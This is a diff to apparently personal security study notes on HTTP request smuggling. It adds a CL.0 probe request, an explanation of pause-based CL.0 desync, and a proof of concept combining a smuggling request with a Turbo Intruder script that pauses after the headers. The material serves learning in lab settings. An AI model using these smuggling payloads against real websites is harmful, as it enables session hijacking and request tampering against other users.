@@ -192,6 +192,17 @@ If the back-end server exhibits this behavior, but the front-end still uses the 
 
 To probe for CL.0 vulnerabilities, first send a request containing another partial request in its body, then send a normal follow-up request. You can then check to see whether the response to the follow-up request was affected by the smuggled prefix.
 
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
 ![alt text](image-1.png)
 ![alt text](image-2.png)
 
@@ -201,6 +212,62 @@ Websites that downgrade HTTP/2 requests to HTTP/1 may be vulnerable to an equiva
 
 ![alt text](image-1.png)
 ![alt text](image-2.png)
+
+
+#### Pause-Based CL.0 Desync Attack
+
+You can potentially use the pause-based technique to elicit CL.0-like behavior, allowing you to construct server-side request smuggling exploits for websites that may initially appear secure
+
+Consider what happens if we send the headers to a vulnerable website, but pause before sending the body.
+
+1. The front-end forwards the headers to the back-end, then continues to wait for the remaining bytes promised by the Content-Length header.
+2. After a while, the back-end times out and sends a response, even though it has only consumed part of the request. At this point, the front-end may or may not read in this response and forward it to us.
+3. We finally send the body, which contains a basic request smuggling prefix in this case.
+4. The front-end server treats this as a continuation of the initial request and forwards this to the back-end down the same connection.
+5. The back-end server has already responded to the initial request, so assumes that these bytes are the start of another request.
+
+
+POC
+
+1. create a CL.0 request smuggling probe like we used in the example above, In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, GET /resources. Observe that you are redirected to /resources/.
+```
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+2. In Turbo Intruder's Python editor panel, adjust the request engine configuration to set the following options:
+
+concurrentConnections=1
+requestsPerConnection=100
+pipeline=False
+
+3. Queue the request, adding the following arguments
+
+pauseMarker - A list of strings after which you want Turbo Intruder to pause.
+pauseTime - The duration of the pause in milliseconds.
+
+This issues the request twice, pausing for 61 seconds after the \r\n\r\n sequence at the end of the headers:
+engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
+
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=500,
+                           pipeline=False
+                           )
+
+    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
 
 ## Client Side Desync / Browser Powered Smuggling
 
@@ -389,3 +456,8 @@ Location: https://attacker-website.com/home/
 ## Browser-Powered Desync Attack
 
 A browser-powered desync attack is when a hacker uses your browser to send specially crafted requests that confuse the servers — allowing them to hijack sessions, steal data, or perform other attacks without needing fancy hacking tools.
+
+
+## Prevention
+
+https://portswigger.net/web-security/request-smuggling#how-to-prevent-http-request-smuggling-vulnerabilities
